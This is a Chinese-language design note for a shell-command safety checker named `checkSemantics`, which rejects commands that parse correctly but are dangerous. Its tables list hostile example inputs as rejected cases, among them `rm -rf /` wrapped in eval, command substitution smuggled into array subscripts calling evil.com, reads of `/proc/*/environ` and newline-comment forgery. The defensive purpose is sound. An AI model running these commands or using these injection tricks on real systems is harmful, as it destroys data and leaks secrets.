# checkSemantics 语义检查（核心节点）

`checkSemantics` 是 AST 解析之后的安检门，专门拦截那些"语法正确但内心险恶"的命令。

---

## 返回结果

```typescript
{ ok: true }                    // 通过，继续后续流程
{ ok: false, reason: "..." }    // 失败，弹窗确认或直接拒绝
```

---

## 六大核心判断节点

### 1. 剥包装器（Wrapper Stripping）

剥掉不改变命令本质的包装器，检查里面的真实命令。剥不掉或遇到未知 flag → 拒绝。

| 示例 | 结果 |
|------|------|
| `nohup eval "rm -rf /"` | 剥掉 `nohup`，检查 `eval` |
| `timeout 5s echo ok` | 剥掉 `timeout 5s`，检查 `echo` |
| `timeout --unknown 5 echo ok` | ❌ 拒绝（未知 flag） |
| `nice $((0-5)) jq ...` | ❌ 拒绝（参数含动态展开） |

---

### 2. 命令名基础校验

剥完 wrapper 后，命令名必须靠谱。

| 问题 | 示例 | 结果 |
|------|------|------|
| 空命令名 | `V="" && $V cmd` | ❌ 拒绝 |
| 占位符（运行时确定） | `$(echo rm) -rf /` | ❌ 拒绝 |
| 不完整片段 | `\| grep foo` | ❌ 拒绝 |

---

### 3. 数组下标注入防御

bash 会在数组下标里执行算术求值，触发 `$(cmd)`。即使单引号里的内容 tree-sitter 认为是安全的，bash 也会执行。

| 示例 | 结果 |
|------|------|
| `printf -v 'a[$(id)]' hello` | ❌ 拒绝 |
| `read 'arr[$(curl evil.com)]' <<< data` | ❌ 拒绝 |
| `[[ 'x[$(id)]' -eq 1 ]]` | ❌ 拒绝 |

> 注：`[[ 'a[x]' == y ]]` 这类字符串比较是安全的，不会触发算术求值。

---

### 4. 危险内置命令拦截

参数会被当作代码执行或能绕过安全机制的命令 → 拒绝。

| 命令 | 结果 | 例外 |
|------|------|------|
| `eval`、`source`、`.` | ❌ 拒绝 | 无 |
| `jq 'system(...)'` | ❌ 拒绝 | 无 |
| `jq -f script.jq` | ❌ 拒绝 | 无 |
| `zmodload`、`autoload` | ❌ 拒绝 | 无 |
| `command foo` | ❌ 拒绝 | `command -v foo` / `command -V foo` ✅ |
| `fc -e ed` | ❌ 拒绝 | `fc -l` / `fc -ln` ✅ |

---

### 5. 敏感文件访问拦截

`/proc/*/environ` 包含其他进程的环境变量（可能有密钥）。

| 示例 | 结果 |
|------|------|
| `cat /proc/self/environ` | ❌ 拒绝 |
| `cat < /proc/1234/environ` | ❌ 拒绝 |

---

### 6. 结构完整性兜底

两条最后的结构检查：

| 问题 | 说明 | 示例 |
|------|------|------|
| AST 误解析 | Shell 关键字不可能是合法命令名 | `for i in a` 被当成命令名 → ❌ 拒绝 |
| 换行 + `#` 伪造注释 | 下游路径验证器可能误以为后续参数被注释掉 | 参数里含 `\n#` → ❌ 拒绝 |

---

## 一句话总结

> `checkSemantics` 不看语法结构，只看**命令的意图和危险性**。它把 AST 提供的"安全结构"再过滤一遍，专门抓那些"语法正确但心思不正"的命令。
